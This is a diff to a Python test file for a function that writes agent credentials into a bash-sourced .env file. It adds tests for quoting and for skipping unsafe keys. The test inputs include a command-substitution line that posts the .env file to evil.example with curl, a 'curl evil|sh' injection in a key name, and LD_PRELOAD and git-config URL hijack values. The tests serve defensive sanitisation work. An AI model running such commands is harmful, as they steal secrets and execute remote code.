@@ -48,6 +48,53 @@ def test_assemble_env_bytes_single_row_has_trailing_newline() -> None:
     )
 
 
+def test_assemble_env_bytes_is_unchanged_for_plain_values() -> None:
+    rows = [_row("TOGGL_TOKEN", "abc123"), _row("OPENAI_API_KEY", "sk-proj-xyz")]
+    assert assemble_env_bytes(rows) == b"TOGGL_TOKEN=abc123\nOPENAI_API_KEY=sk-proj-xyz\n", (
+        "plain values must serialize exactly as they always have: these bytes are hashed "
+        "into the fingerprint that decides whether a live agent's mounted .env is current, "
+        "so extra quoting would invalidate every agent at once"
+    )
+
+
+def test_assemble_env_bytes_quotes_a_value_that_needs_it() -> None:
+    rows = [_row("MULTILINE", "-----BEGIN KEY-----\nabc\n-----END KEY-----")]
+    assert assemble_env_bytes(rows) == (
+        b'MULTILINE="-----BEGIN KEY-----\\nabc\\n-----END KEY-----"\n'
+    ), "a value with newlines is double-quoted and escaped so it can be read back"
+
+
+def test_assemble_env_bytes_single_quotes_a_value_bash_would_expand() -> None:
+    rows = [_row("NOTE", "$(curl -s evil.example -d @/mnt/session/uploads/.env)")]
+    assert assemble_env_bytes(rows) == (
+        b"NOTE='$(curl -s evil.example -d @/mnt/session/uploads/.env)'\n"
+    ), "the file is sourced by bash, so command substitution must be inert"
+
+
+def test_assemble_env_bytes_leaves_out_rows_stored_under_an_unsafe_name() -> None:
+    rows = [
+        _row("OK", "1"),
+        _row("LD_PRELOAD", "/tmp/evil.so"),
+        _row("GIT_CONFIG_KEY_0", "url.https://evil.example/.insteadOf"),
+        _row("X;curl evil|sh;Y", "1"),
+        _row("NUL_VALUE", "a\0b"),
+        _row("AFTER", "2"),
+    ]
+    with structlog.testing.capture_logs() as logs:
+        assembled = assemble_env_bytes(rows)
+    assert assembled == b"OK=1\nAFTER=2\n", (
+        "a row stored before the name rule existed must never be exported"
+    )
+    skipped = [log for log in logs if log["event"] == "credential_env.row_skipped"]
+    assert [log["key"] for log in skipped] == [
+        "LD_PRELOAD",
+        "GIT_CONFIG_KEY_0",
+        "X;curl evil|sh;Y",
+        "NUL_VALUE",
+    ]
+    assert all("evil.so" not in str(log) for log in skipped), "values are never logged"
+
+
 def test_assemble_env_bytes_unicode_roundtrips_byte_exact() -> None:
     value = "café-π-密钥"
     rows = [_row("UNICODE", value)]
@@ -99,8 +146,22 @@ async def test_upload_env_and_mount_uploads_env_and_returns_mount_dict(
 ) -> None:
     tenant = await make_tenant(db_session)
     agent_id = uuid.uuid4()
-    await put_agent_file(db_session, tenant_id=tenant.id, agent_id=agent_id, key="A", content="1")
-    await put_agent_file(db_session, tenant_id=tenant.id, agent_id=agent_id, key="B", content="2")
+    await put_agent_file(
+        db_session,
+        tenant_id=tenant.id,
+        agent_id=agent_id,
+        key="A",
+        content="1",
+        set_by_account_id=None,
+    )
+    await put_agent_file(
+        db_session,
+        tenant_id=tenant.id,
+        agent_id=agent_id,
+        key="B",
+        content="2",
+        set_by_account_id=None,
+    )
     await db_session.commit()
 
     capture = _UploadCapture(file_id="file_test123")
@@ -147,7 +208,14 @@ async def test_upload_env_and_mount_enqueues_ttl_delete(
 ) -> None:
     tenant = await make_tenant(db_session)
     agent_id = uuid.uuid4()
-    await put_agent_file(db_session, tenant_id=tenant.id, agent_id=agent_id, key="A", content="1")
+    await put_agent_file(
+        db_session,
+        tenant_id=tenant.id,
+        agent_id=agent_id,
+        key="A",
+        content="1",
+        set_by_account_id=None,
+    )
     await db_session.commit()
 
     capture = _UploadCapture(file_id="file_ttl")
@@ -178,10 +246,20 @@ async def test_upload_env_and_mount_is_tenant_isolated(
     tenant_b = await make_tenant(db_session)
     agent_id = uuid.uuid4()  # same agent_id across tenants
     await put_agent_file(
-        db_session, tenant_id=tenant_a.id, agent_id=agent_id, key="A_KEY", content="aval"
+        db_session,
+        tenant_id=tenant_a.id,
+        agent_id=agent_id,
+        key="A_KEY",
+        content="aval",
+        set_by_account_id=None,
     )
     await put_agent_file(
-        db_session, tenant_id=tenant_b.id, agent_id=agent_id, key="B_KEY", content="bval"
+        db_session,
+        tenant_id=tenant_b.id,
+        agent_id=agent_id,
+        key="B_KEY",
+        content="bval",
+        set_by_account_id=None,
     )
     await db_session.commit()
 
@@ -210,6 +288,7 @@ async def test_upload_env_and_mount_never_logs_secret_values(
         agent_id=agent_id,
         key="SECRET",
         content=secret_value,
+        set_by_account_id=None,
     )
     await db_session.commit()
 
